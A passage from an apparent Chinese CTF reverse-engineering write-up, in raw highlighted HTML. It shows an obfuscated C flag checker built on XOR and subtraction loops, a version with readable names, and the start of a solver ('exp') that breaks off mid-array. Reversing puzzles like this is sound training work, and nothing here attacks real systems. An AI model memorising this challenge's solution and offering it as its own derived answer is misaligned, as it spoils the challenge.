class="hljs-number">0x25</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x8D</span>&#125;;<br>    <span class="hljs-type">int</span>  o00O0OO000OO0oooo0o0oo0O000O0OO0O0O00OO0OO0O00000[] = &#123;<span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>&#125;;<br>    <span class="hljs-type">int</span> o00O0OO000OO0oooo0o0oo0O000000O00O0O0OO0O0O00OO0OO0O[]=&#123;<span class="hljs-number">0x65</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>&#125;;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(URL);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        o00O0OO000OO0oooo0o0oo0O000000O00O0O0OO0O0O00OO0OO0O[i] ^=  o00O0OO000OO0oooo0o0oo0O000O0OO0O0O00OO0OO0O00000[i+<span class="hljs-number">1</span>];  <br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O0O00OO0OO0O[i] ^=  o00O0OO000OO0oooo0o0oo0O0000oooooooO0O0OO0O0O00OO0OO0O[i];  <br>        <br>    &#125;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        o00O0OO000OO0oooo0o0oo0O000000O00O0O0OO0O0O00OO0OO0O[i] -=  o00O0OO000OO0oooo0o0oo0O0000oooooooO0O0OO0O0O00OO0OO0O[i];  <br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>            o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O0O00OO0OO0O[i] -=  o00O0OO000OO0oooo0o0oo0O0000oooooooO0O0OO0O0O00OO0OO0O[<span class="hljs-number">47</span> + i];  <br>             o00O0OO000OO0oooo0o0oo0O0000oooooooO0O0OO0O0O00OO0OO0O[i]^=o00O0OO000OO0oooo0o0oo0O000000O00O0O0OO0O0O00OO0OO0O[<span class="hljs-number">51</span>];<br>        <br>&#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O0O00OO0OO0O[i] +=  o00O0OO000OO0oooo0o0oo0O000O0OO0O0O00OO0OO0O00000[i];  <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>        <span class="hljs-keyword">if</span>(o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O0O00OO0OO0O[i] != o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O00000O0OO0O[i])&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>改成这样好看一些，然后re</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <br>    <span class="hljs-type">char</span> URL[<span class="hljs-number">46</span>];<br>    <span class="hljs-type">char</span> flag0[<span class="hljs-number">46</span>];<br>    <span class="hljs-built_in">strcpy</span>(flag0, URL);<br>    <span class="hljs-type">char</span> flag1[] = &#123;<span class="hljs-number">0x96</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xd4</span>&#125;;<br>    <span class="hljs-type">int</span>  flag2[] = &#123;<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x8D</span>&#125;;<br>    <span class="hljs-type">int</span>  flag3[] = &#123;<span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>&#125;;<br>    <span class="hljs-type">int</span>  flag4[]=&#123;<span class="hljs-number">0x65</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>&#125;;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(URL);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        flag4[i] ^=  flag3[i+<span class="hljs-number">1</span>];  <br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        flag0[i] ^=  flag2[i];  <br>        <br>    &#125;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        flag4[i] -=  flag2[i];  <br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>            flag0[i] -=  flag2[<span class="hljs-number">47</span> + i];  <br>            flag2[i]^=flag4[<span class="hljs-number">51</span>];<br>        <br>&#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        flag0[i] +=  flag3[i];  <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>        <span class="hljs-keyword">if</span>(flag0[i] !=flag1[i])&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <br>    <span class="hljs-type">char</span> URL[<span class="hljs-number">46</span>]=&#123;&#125;;<br>    <span class="hljs-type">char</span> flag0[<span class="hljs-number">46</span>]=&#123;&#125;;<br><br>     <span class="hljs-type">char</span> flag1[] = &#123;<span class="hljs-number">0x96</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xd4</span>&#125;;<br>    <span class="hljs-type">int</span>  flag2[] = &#123;<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span 